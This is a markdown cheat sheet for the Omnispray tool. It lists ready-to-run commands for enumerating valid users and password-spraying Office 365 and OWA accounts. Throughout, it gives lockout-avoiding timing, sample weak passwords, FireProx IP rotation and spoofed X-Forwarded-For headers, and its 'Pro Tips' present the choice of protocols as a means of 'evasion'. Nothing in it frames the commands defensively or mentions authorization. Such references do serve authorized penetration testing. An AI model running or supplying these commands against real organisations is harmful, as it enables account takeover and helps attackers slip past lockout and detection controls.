# Omnispray

**Type:** Python Framework
**Purpose:** Modular enumeration and password spraying framework (successor to o365spray)
**Platform:** Windows, Linux, macOS
**Tags:** #enumeration #password-spray #modular #o365 #owa #python

---

## Installation

```bash
git clone https://github.com/0xZDH/Omnispray.git
cd Omnispray
pip3 install -r requirements.txt
```

---

## Quick Reference

```bash
# O365 enumeration
python3 omnispray.py --type enum -uf users.txt --module o365_enum_office

# O365 password spray
python3 omnispray.py --type spray -uf users.txt -pf passwords.txt --module o365_spray_activesync --count 2 --lockout 30

# With FireProx
python3 omnispray.py --type spray -uf users.txt -p 'Password!' --module o365_spray_oauth2 --proxy-url https://xyz.execute-api.us-east-1.amazonaws.com/fireprox/
```

---

## Available Modules

**Enumeration:**
- o365_enum_office
- o365_enum_oauth2
- o365_enum_activesync
- owa_enum_basic

**Spraying:**
- o365_spray_activesync
- o365_spray_oauth2
- o365_spray_ews
- owa_spray_basic

---

## ENUM: User Enumeration

```bash
# Office module (recommended)
python3 omnispray.py --type enum -uf users.txt --module o365_enum_office --domain company.com

# OAuth2 module
python3 omnispray.py --type enum -uf users.txt --module o365_enum_oauth2 --domain company.com

# ActiveSync module
python3 omnispray.py --type enum -uf users.txt --module o365_enum_activesync --domain company.com

# OWA enumeration
python3 omnispray.py --type enum -uf users.txt --module owa_enum_basic --url https://mail.company.com
```

---

## CRED: Password Spraying

```bash
# ActiveSync spray (common)
python3 omnispray.py --type spray -uf valid-users.txt -p 'Password123!' --module o365_spray_activesync --count 1 --lockout 15

# OAuth2 spray
python3 omnispray.py --type spray -uf users.txt -p 'Summer2024!' --module o365_spray_oauth2 --count 2 --lockout 30

# EWS spray
python3 omnispray.py --type spray -uf users.txt -pf passwords.txt --module o365_spray_ews --count 3 --lockout 45

# OWA spray
python3 omnispray.py --type spray -uf users.txt -p 'Password!' --module owa_spray_basic --url https://mail.company.com
```

---

## Advanced Options

```bash
# With proxy
python3 omnispray.py --type spray -uf users.txt -p 'Pass!' --module o365_spray_oauth2 --proxy http://127.0.0.1:8080

# With FireProx
python3 omnispray.py --type spray -uf users.txt -p 'Pass!' --module o365_spray_oauth2 --proxy-url https://abc.execute-api.us-east-1.amazonaws.com/fireprox/

# Custom headers
python3 omnispray.py --type spray -uf users.txt -p 'Pass!' --module o365_spray_oauth2 --proxy-url https://fireprox-url/ --proxy-headers "X-My-X-Forwarded-For: 1.2.3.4"

# Rate limiting
python3 omnispray.py --type spray -uf users.txt -p 'Pass!' --module o365_spray_oauth2 --rate 5 --pause 2

# Custom output
python3 omnispray.py --type enum -uf users.txt --module o365_enum_office --outdir ./custom-results/ --logdir ./custom-logs/
```

---

## Lockout Protection

```bash
# Conservative: 1 password every 30 minutes
python3 omnispray.py --type spray -uf users.txt -pf passwords.txt --module o365_spray_activesync --count 1 --lockout 30

# Moderate: 2 passwords every 20 minutes
python3 omnispray.py --type spray -uf users.txt -pf passwords.txt --module o365_spray_oauth2 --count 2 --lockout 20

# --count: passwords per cycle
# --lockout: minutes to wait between cycles
```

---

## Custom Modules

Omnispray supports custom module development:
- See MODULES.md in repository
- Templates for enum and spray modules
- Extend to new targets/applications

---

## Pro Tips

💡 **Modular Design**: Easier to extend than o365spray
💡 **FireProx Ready**: Built-in support for proxy URLs
💡 **Multiple Modules**: Different protocols for evasion
💡 **Custom Development**: Easy to add new target modules
💡 **Rate Control**: Granular control over request rate
💡 **Successor**: Replaces o365spray with more flexibility

---

## Resources

- GitHub: https://github.com/0xZDH/Omnispray
- Author: @0xZDH
- Related: o365spray (predecessor)
